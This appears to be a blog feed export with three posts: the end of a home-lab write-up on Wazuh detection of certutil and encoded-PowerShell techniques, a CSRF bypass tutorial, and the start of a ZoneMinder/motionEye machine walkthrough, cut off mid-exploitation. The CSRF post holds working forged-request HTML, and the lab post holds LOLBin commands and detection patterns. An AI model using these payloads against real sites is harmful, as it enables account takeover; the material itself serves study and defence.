- [..] &quot;POST /vulnerabilities/exec/ HTTP/1.1&quot; 200 4880</span></span><br></pre></td></tr></table></figure><blockquote><p>🟡 <strong>Detected? Visibility restored, partially.</strong> The Docker fix works, but its coverage is uneven by attack type, which is a property of Apache’s default log format, not a flaw in the fix.<br>GET-based attacks (SQLi, XSS, payload in the URL) are now fully visible end-to-end: the complete injection string reaches <code>archives.log</code> intact. POST-based attacks (command injection, payload in the body) are visible as “a request happened” but not what it contained, since standard Apache access-log format never includes POST bodies. No sub-technique yet reaches <code>alerts.log</code>: raw access-log text arriving via a generic <code>full_command</code> source has no decoder mapping it to HTTP traffic, so nothing currently matches a rule even where the data genuinely arrives.</p></blockquote><hr><h3 id="Scenario-4-—-Windows-Living-off-the-Land-LOTL"><a href="#Scenario-4-—-Windows-Living-off-the-Land-LOTL" class="headerlink" title="Scenario 4 — Windows Living-off-the-Land (LOTL)"></a>Scenario 4 — Windows Living-off-the-Land (LOTL)</h3><p><strong>Techniques:</strong> <code>T1105</code> – Ingress Tool Transfer, <code>T1059.001</code> – PowerShell, <code>T1027</code> – Obfuscated Files or Information · <strong>Tools:</strong> <code>certutil.exe</code>, <code>powershell -enc</code></p><h4 id="T1105-—-certutil-ingress-tool-transfer"><a href="#T1105-—-certutil-ingress-tool-transfer" class="headerlink" title="T1105 — certutil (ingress tool transfer)"></a>T1105 — certutil (ingress tool transfer)</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> https://www.microsoft.com/robots.txt C:\Windows\Temp\lolbin_test.txt</span><br></pre></td></tr></table></figure><p><img src="/img/soc-scenario4-certutil.png" alt="certutil used as a LOLBin to download a file"></p><h4 id="Initial-detection"><a href="#Initial-detection" class="headerlink" title="Initial detection"></a>Initial detection</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> grep -i <span class="string">&quot;certutil\|lolbin_test&quot;</span> /var/ossec/logs/archives/archives.log</span><br></pre></td></tr></table></figure><p><img src="/img/soc-scenario4-certutil-archive.png" alt="archives.log entry for the PowerShell script block running certutil"></p><p><strong>Important nuance:</strong> this wasn’t captured because <code>certutil</code> generates process-creation telemetry; it doesn’t, and no Sysmon or native 4688 command-line auditing is deployed in this build. It was captured because the command was typed <em>at a PowerShell prompt</em>, and script block logging records whatever PowerShell is asked to run, including invocations of external binaries.</p><p>That means detection here is contingent on the LOLBin being launched from inside PowerShell specifically. The identical technique from <code>cmd.exe</code>, a scheduled task, or a non-PowerShell parent process would leave no equivalent trace in this build.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> grep -i <span class="string">&quot;certutil\|lolbin_test&quot;</span> /var/ossec/logs/alerts/alerts.log</span><br></pre></td></tr></table></figure><blockquote><p>🔴 <strong>Alerted? No.</strong> Real telemetry reached the manager, but Wazuh’s default PowerShell ruleset doesn’t flag a plain certutil invocation. No rule matches that pattern out of the box.</p></blockquote><h4 id="Remediation-—-a-custom-detection-rule"><a href="#Remediation-—-a-custom-detection-rule" class="headerlink" title="Remediation — a custom detection rule"></a>Remediation — a custom detection rule</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;100100&quot;</span> <span class="attr">level</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">if_group</span>&gt;</span>windows<span class="tag">&lt;/<span class="name">if_group</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;win.eventdata.scriptBlockText&quot;</span> <span class="attr">type</span>=<span class="string">&quot;pcre2&quot;</span>&gt;</span>(?i)(certutil.*urlcache|bitsadmin|mshta|IEX|Invoke-Expression|DownloadString|-enc |-encodedcommand)<span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Suspicious PowerShell / LOLBin activity detected in script block<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mitre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>T1105<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>T1059.001<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>T1027<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">mitre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Loaded into <code>local_rules.xml</code>, manager restarted, identical certutil command re-run.</p><p><img src="/img/soc-scenario4-certutil-dashboard.png" alt="Wazuh dashboard alert after loading the custom detection rule"></p><p><img src="/img/soc-scenario4-certutil-dashboard-2.png" alt="Custom rule alert detail with MITRE ATT&amp;CK fields populated"></p><blockquote><p>🟢 <strong>Detected? Yes, after remediation.</strong> Correct <code>scriptBlockText</code>, correct rule ID, MITRE fields populated with all three technique IDs and their tactics (Command and Control, Execution, Defense Evasion), confirmed via the raw alert document, not just the dashboard view.</p></blockquote><h4 id="T1059-001-T1027-—-encoded-command"><a href="#T1059-001-T1027-—-encoded-command" class="headerlink" title="T1059.001 &#x2F; T1027 — encoded command"></a>T1059.001 &#x2F; T1027 — encoded command</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&#x27;Write-Host &quot;LOTL-test-encoded-payload&quot;&#x27;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encoded</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">powershell <span class="literal">-enc</span> <span class="variable">$encoded</span></span><br></pre></td></tr></table></figure><p>Ran without any additional rule changes, since the existing pattern already covers <code>-enc </code>.</p><p><img src="/img/soc-scenario4-encoded-command.png" alt="Encoded PowerShell command executed on the Windows endpoint"></p><p><img src="/img/soc-scenario4-encoded-command-archive.png" alt="archives.log showing both the encoded and auto-decoded script block events"></p><p>Two separate scriptblock events generated per run: the literal typed command (<code>powershell -enc $encoded</code>), and a second, separate event containing the auto-decoded true payload, a deliberate Microsoft anti-evasion behavior that logs the real command regardless of base64 obfuscation. Only the first event contains the <code>-enc </code> pattern and matches the rule.</p><p><img src="/img/soc-scenario4-encoded-command-dashboard1.png" alt="Wazuh dashboard alert for the encoded command, first view"></p><p><img src="/img/soc-scenario4-encoded-command-dashboard2.png" alt="Wazuh dashboard alert for the encoded command, detail view"></p><blockquote><p>🟢 <strong>Detected? Yes.</strong> Same rule, no modification, caught a second, distinct technique on first attempt.</p></blockquote><hr><h2 id="Lessons-Learned"><a href="#Lessons-Learned" class="headerlink" title="Lessons Learned"></a>Lessons Learned</h2><blockquote><p>🔑 <strong>Azure NSG rules scoped to a private-subnet CIDR do not extend to that same host’s public IP.</strong> Traffic to a public IP routes through Azure’s edge, not the VNet backbone, and gets evaluated against the implicit default-deny instead. The same host, same NSG, can present completely different exposure depending on which address is used.</p><p><strong>A manager’s <code>logall</code> flag being off doesn’t just mean “less logging”; it silently invalidates an entire category of evidence.</strong> An empty <code>archives.log</code> with <code>logall</code> disabled proves nothing about visibility; it only means nothing matched an alert rule, which <code>alerts.log</code> already covers. This cost real time to catch, well after several scenarios had already been run against a manager quietly missing this flag.</p><p><strong>The Wazuh dashboard only indexes alerted events; raw archived telemetry isn’t searchable in the UI, even with <code>logall</code> on.</strong> A technique can have full, genuine visibility on the manager and still show zero results in the dashboard, because indexing requires a rule match. Manual log inspection on the manager remains the more authoritative check, every time.</p><p><strong>Searching <code>alerts.log</code> for attack-related keywords can self-match your own command history.</strong> Wazuh logs the sudo audit trail of the search command itself: if your search term appears in the command you typed, it matches its own grep. This exact trap recurred in three separate scenarios before the pattern was recognized and worked around by filtering on <code>rule.groups</code>&#x2F;<code>rule.id</code> instead of free-text search.</p><p><strong>PowerShell script block logging captures the literal command line typed at the prompt, including invocations of external binaries like <code>certutil</code>, but this is not process-creation telemetry.</strong> Detection of a LOLBin technique here is contingent on it being launched from inside PowerShell specifically; the same technique from <code>cmd.exe</code> or a non-PowerShell parent process would leave no equivalent trace in this build.</p><p><strong>Apache’s default access log format never includes POST request bodies.</strong> Fixing container log visibility restores full end-to-end visibility for GET-based attacks (payload in the URL) but only proves “a request happened,” not its content, for POST-based attacks like command injection, a distinct, separate gap.</p><p><strong>Wazuh’s default sshd ruleset alerts every individual authentication event, but only escalates to a distinct brute-force alert past a frequency threshold.</strong> A fast, successful credential guess that stays under that threshold is fully visible event-by-event but never flagged as anomalous. “Every event logged” and “attack pattern recognized” are meaningfully different levels of detection maturity.</p></blockquote><hr><h2 id="Closing-Thoughts"><a href="#Closing-Thoughts" class="headerlink" title="Closing Thoughts"></a>Closing Thoughts</h2><p>The result I set out to prove wasn’t “this SIEM catches everything.” It was that I can build a realistic, segmented environment, reason correctly about how two different systems enforce the same security goal from different defaults, run genuine attacks against my own infrastructure, and when something doesn’t get caught, figure out precisely why and fix it. Three of the four scenarios exposed a real gap. Two of those gaps got fixed live, with proof. The one that didn’t (the structural HIDS&#x2F;NIDS boundary in Scenario 1) is exactly the kind of limitation a real analyst needs to be able to name accurately rather than paper over.</p><p>That loop (predict, test, verify, diagnose, fix, re-verify) is the whole job. This project is a small, honest demonstration of it, end to end.</p>]]></content>
      
      
      <categories>
          
          <category> Home Lab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SOC </tag>
            
            <tag> Wazuh </tag>
            
            <tag> Azure </tag>
            
            <tag> OPNsense </tag>
            
            <tag> MITRE ATT&amp;CK </tag>
            
            <tag> Home Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF (Cross-Site Request Forgery)</title>
      <link href="/2026/07/21/CSRF/"/>
      <url>/2026/07/21/CSRF/</url>
      
        <content type="html"><![CDATA[<blockquote><p> <strong>Difficulty</strong>: <span style="color:#9fef00">Practitioner</span></p></blockquote><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>CSRF is what happens when a website trusts a request just because it arrives with a valid session cookie, without checking whether the user actually <em>meant</em> to send it.<br>This path covers how that trust gets abused, how apps try to defend against it with tokens, <code>SameSite</code> cookies and <code>Referer</code> checks, and how each of those defenses commonly falls apart.</p><span id="more"></span><h2 id="What-Makes-CSRF-Possible"><a href="#What-Makes-CSRF-Possible" class="headerlink" title="What Makes CSRF Possible"></a>What Makes CSRF Possible</h2><p>A request is forgeable when three things line up at once:</p><ol><li><strong>The action is worth forging</strong> - changing an email, a password, a permission, transferring funds, anything that matters to an attacker.</li><li><strong>Cookies are the only proof of identity</strong> - no other mechanism ties the request to the user who’s supposed to be making it.</li><li><strong>Nothing in the request is unpredictable</strong> - if the attacker can guess every parameter, they can build the request themselves without ever seeing the victim’s screen.</li></ol><p>If any one of these is missing, CSRF doesn’t work. Miss the third one and even a change-password form needs the <em>current</em> password, which the attacker won’t have.</p><h2 id="Anatomy-of-an-Attack"><a href="#Anatomy-of-an-Attack" class="headerlink" title="Anatomy of an Attack"></a>Anatomy of an Attack</h2><p>Say changing an email address looks like this on the wire:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /email/change HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</span><br><span class="line"></span><br><span class="line">email=wiener@normal-user.com</span><br></pre></td></tr></table></figure><p>No token, no secondary check, just a cookie. An attacker can reproduce this request from any page on the internet by hosting a self-submitting form:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The victim just has to be logged in and visit that page. Their browser attaches the session cookie automatically (this is exactly why cookies alone are a bad identity check), and the server processes the request as if the real user submitted it.</p><p>If the vulnerable action accepts <code>GET</code>, you don’t even need a hosted page, a single URL does the job:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;https://vulnerable-website.com/email/change?email=pwned@evil-user.net&quot;&gt;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>Burp Suite Professional has a built-in <strong>Generate CSRF PoC</strong> option (right-click any request → Engagement tools). It builds the auto-submit HTML for you and strips the cookie header, since the browser adds that part on its own.</p></div><h2 id="Breaking-CSRF-Token-Defenses"><a href="#Breaking-CSRF-Token-Defenses" class="headerlink" title="Breaking CSRF Token Defenses"></a>Breaking CSRF Token Defenses</h2><p>The standard fix is a <strong>CSRF token</strong>: a secret, unpredictable value the server hands out and then demands back on every state-changing request.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>That’s solid <em>if</em> implemented correctly. In practice, most real-world bypasses come down to sloppy validation logic:</p><ul><li><strong>Method-dependent checks</strong> - the token is verified on <code>POST</code> but the same endpoint happily accepts <code>GET</code>, so just switch methods and drop the token entirely.</li><li><strong>Presence-dependent checks</strong> - the token is verified <em>if it’s there</em>, but its absence is treated as fine. Strip the parameter, not just its value.</li><li><strong>Token not bound to the session</strong> - the server keeps one global pool of valid tokens instead of tying each token to the user who requested it. Log in as yourself, grab a fresh token, hand that same token to the victim.</li><li><strong>Token bound to the wrong cookie</strong> - the token is checked against a separate <code>csrfKey</code> cookie instead of the session cookie. If you can plant <em>any</em> cookie in the victim’s browser (even from a sibling subdomain), you can pair it with a token you already know.</li><li><strong>Double-submit tokens</strong> - the app just checks that the token in the request matches the token in a cookie, with no server-side record of what was issued. If you can set cookies on the victim, you don’t even need a valid token, just invent one and put the same value in both places.</li></ul><div class="note warning flat"><p>A token is only spent once it’s <strong>submitted and accepted</strong>. Loading the page that displays it (a plain <code>GET</code>) does not burn it, that’s the gap that makes the “steal your own token, feed it to the victim” trick work.</p></div><h2 id="Breaking-SameSite-Defenses"><a href="#Breaking-SameSite-Defenses" class="headerlink" title="Breaking SameSite Defenses"></a>Breaking SameSite Defenses</h2><p><code>SameSite</code> is a cookie attribute that tells the browser when to withhold a cookie from cross-site requests. Three levels:</p><table><thead><tr><th>Value</th><th>Behavior</th></tr></thead><tbody><tr><td><code>Strict</code></td><td>Cookie never sent cross-site, period.</td></tr><tr><td><code>Lax</code></td><td>Cookie sent cross-site only on top-level <code>GET</code> navigations (clicking a link). Blocked on cross-site <code>POST</code>, iframes, images, scripts.</td></tr><tr><td><code>None</code></td><td>No restriction at all (requires <code>Secure</code>).</td></tr></tbody></table><p>Since 2021, Chrome defaults undeclared cookies to <code>Lax</code>. That kills the classic auto-submitting <code>POST</code> form, but it leaves gaps:</p><p><strong>Method laundering.</strong> If the server doesn’t actually care whether the request arrived as <code>GET</code> or <code>POST</code> (some frameworks let you override the method via a hidden <code>_method</code> field), a plain top-level <code>GET</code> navigation still carries a <code>Lax</code> cookie:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amp;amount=1000000&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>On-site gadgets.</strong> <code>Strict</code> normally survives this, since the browser only cares who <em>initiated</em> the request. The workaround is splitting one cross-site jump into two hops:</p><ol><li>The attacker page sends the victim to a legitimate page on the <em>real</em> site, one that reads a parameter and hands it to <code>window.location</code> (a DOM-based open redirect gadget). This first hop is cross-site, but it doesn’t need auth, so no cookie required.</li><li>That page’s own script then fires the second navigation. As far as the browser is concerned, this jump started <em>on</em> the target site, so it’s same-site, and the <code>Strict</code> cookie rides along.</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerable page on victim.com, reads ?url= and redirects</span></span><br><span class="line"><span class="keyword">const</span> target = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>).<span class="title function_">get</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = target;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- attacker&#x27;s page --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;https://victim-site/redirect?url=/my-account/change-email%3Femail%3Dhacker%40evil-user.net&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The browser never sees a single cross-site request landing on the sensitive endpoint, it sees two requests, and the second one looks like it came from the site itself.</p><p><strong>Sibling domains.</strong> <code>SameSite</code> only cares about the <em>site</em> (eTLD+1), not the exact origin. Any XSS or open redirect anywhere on <code>*.example.com</code> can be leveraged to fire a same-site request against <code>secure.example.com</code>. The same logic extends to WebSockets, a cross-site WebSocket handshake is just CSRF wearing a different protocol.</p><p><strong>The 120-second grace window.</strong> Chrome’s default <code>Lax</code> isn’t enforced for the first two minutes after a cookie with no explicit <code>SameSite</code> attribute is issued, to avoid breaking SSO redirects. If you can force the victim through a flow that re-issues their session cookie (an OAuth round-trip, for example) right before firing the attack, you land inside that window.</p><h2 id="Breaking-Referer-Based-Defenses"><a href="#Breaking-Referer-Based-Defenses" class="headerlink" title="Breaking Referer-Based Defenses"></a>Breaking Referer-Based Defenses</h2><p>Checking the <code>Referer</code> header is weaker than tokens and usually breaks in one of two ways:</p><ul><li><strong>Missing header is treated as valid.</strong> Force the browser to drop <code>Referer</code> entirely with a meta tag on the attacker’s page, and the check never runs:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;never&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><strong>Naive substring matching.</strong> If the server just checks that the domain <em>starts with</em> or <em>contains</em> the right value, both of these slip through:<figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable-website.com.attacker-website.com/csrf-attack</span><br><span class="line">http://attacker-website.com/csrf-attack?vulnerable-website.com</span><br></pre></td></tr></table></figure>Note: modern browsers strip the query string from <code>Referer</code> by default, so the second trick only works if the response serving the exploit sets <code>Referrer-Policy: unsafe-url</code>.</li></ul><h2 id="How-To-Prevent-CSRF"><a href="#How-To-Prevent-CSRF" class="headerlink" title="How To Prevent CSRF"></a>How To Prevent CSRF</h2><ul><li>Generate a real, unpredictable CSRF token, tie it to the user’s session server-side, and reject any request where it’s missing, wrong, or the method was switched to dodge the check.</li><li>Treat <code>SameSite=Strict</code> (or <code>Lax</code> at minimum) as defense in depth, not a replacement for tokens, gadgets and sibling domains can still slip past it.</li><li>Don’t rely on <code>Referer</code> as your only line of defense, it’s optional and attacker-influenced by design.</li></ul><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>CSRF rarely fails because tokens or <code>SameSite</code> don’t exist, it fails because they’re wired up inconsistently: checked on one method but not another, tied to the wrong cookie, or trusted without being verified server-side. Auditing an app for CSRF is really just auditing <em>every place validation could have been skipped</em>.</p><div class="note info flat"><p>As always, I scripted the lab solves instead of clicking through the UI, it’s a better way to actually internalize what each bypass depends on. Repo here: <a href="https://github.com/0xkoat/portswigger_scripts/tree/main/CSRF">CSRF Scripts Repo</a></p></div><p>Have a nice day, and see you again in the next Article!<br>Any feedback in the comments section is very appreciated.<br>Thank you for your attention.</p>]]></content>
      
      
      <categories>
          
          <category> Portswigger </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Portswigger </tag>
            
            <tag> Web Security </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCTV</title>
      <link href="/2026/07/11/CCTV/"/>
      <url>/2026/07/11/CCTV/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>Difficulty</strong>: <span style="color:#9fef00">Easy</span> &nbsp;|&nbsp; <strong>OS</strong>: <span style="color:#9fef00">Linux</span></p></blockquote><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This machine demonstrates how chaining two recent vulnerabilities in <strong>ZoneMinder</strong> and <strong>motionEye</strong> leads to full root compromise. Starting from default credentials, a time-based SQL injection (<strong>CVE-2024-51482</strong>) was used to extract user hashes, followed by credential reuse and an OS command injection (<strong>CVE-2025-60787</strong>) to gain root access.</p><p>This walkthrough covers a realistic attack chain from initial access all the way to full system compromise.</p><span id="more"></span><hr><h2 id="1-Reconnaissance"><a href="#1-Reconnaissance" class="headerlink" title="1. Reconnaissance"></a>1. Reconnaissance</h2><p>The engagement began with standard service discovery. A quick <code>nmap</code> scan revealed two open ports:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sV 10.129.26.87</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-05 16:29 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.26.87</span><br><span class="line">Host is up (0.072s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.58</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.81 seconds</span><br></pre></td></tr></table></figure><ul><li><strong>Port 22 (SSH):</strong> OpenSSH 9.6p1</li><li><strong>Port 80 (HTTP):</strong> Apache 2.4.58</li></ul><p>After adding <code>cctv.htb</code> to my <code>/etc/hosts</code> file, I navigated to the web server and was greeted by a <strong>ZoneMinder v1.37.63</strong> login page.</p><p><img src="/img/cctv-zm-login.png" alt="ZoneMinder v1.37.63 console, logged in with admin:admin"></p><p>In a classic “low-hanging fruit” moment, default credentials (<code>admin:admin</code>) worked perfectly, granting me access to the console. This highlights a common real-world misconfiguration where publicly exposed services rely on unchanged default credentials, effectively bypassing authentication controls.</p><hr><h2 id="2-Exploitation-—-CVE-2024-51482-ZoneMinder-Time-Based-SQLi"><a href="#2-Exploitation-—-CVE-2024-51482-ZoneMinder-Time-Based-SQLi" class="headerlink" title="2. Exploitation — CVE-2024-51482 (ZoneMinder Time-Based SQLi)"></a>2. Exploitation — CVE-2024-51482 (ZoneMinder Time-Based SQLi)</h2><p>Knowing that ZoneMinder has had its share of vulnerabilities, I looked for recent CVEs and identified <strong>CVE-2024-51482</strong>, a time-based blind SQL injection in the <code>tid</code> parameter.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>The vulnerable code lives in <code>web/ajax/event.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;removetag&#x27;</span> :</span><br><span class="line">    <span class="variable">$tagId</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;tid&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">dbQuery</span>(<span class="string">&#x27;DELETE FROM Events_Tags WHERE TagId = ? AND EventId = ?&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$tagId</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>]));</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM Events_Tags WHERE TagId = <span class="subst">$tagId</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$rowCount</span> = <span class="title function_ invoke__">dbNumRows</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$rowCount</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&#x27;DELETE FROM Tags WHERE Id = ?&#x27;</span>;</span><br><span class="line">      <span class="variable">$values</span> = <span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;tid&#x27;</span>]);</span><br><span class="line">      <span class="variable">$response</span> = <span class="title function_ invoke__">dbNumRows</span>(<span class="variable">$sql</span>, <span class="variable">$values</span>);</span><br><span class="line">      <span class="title function_ invoke__">ajaxResponse</span>(<span class="keyword">array</span>(<span class="string">&#x27;response&#x27;</span>=&gt;<span class="variable">$response</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>$tagId</code> is concatenated directly into <code>$sql</code> without any parameterization or sanitization. Since no output is reflected back to the user, exploitation relies on time-based techniques (e.g. <code>SLEEP()</code>) to infer data through response delays — a boolean&#x2F;time-based blind injection.</p><p><strong>Vulnerable endpoint:</strong></p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1</span><br></pre></td></tr></table></figure><h3 id="Dumping-the-Database"><a href="#Dumping-the-Database" class="headerlink" title="Dumping the Database"></a>Dumping the Database</h3><p>To exploit this, I grabbed my <code>ZMSESSID</code> cookie 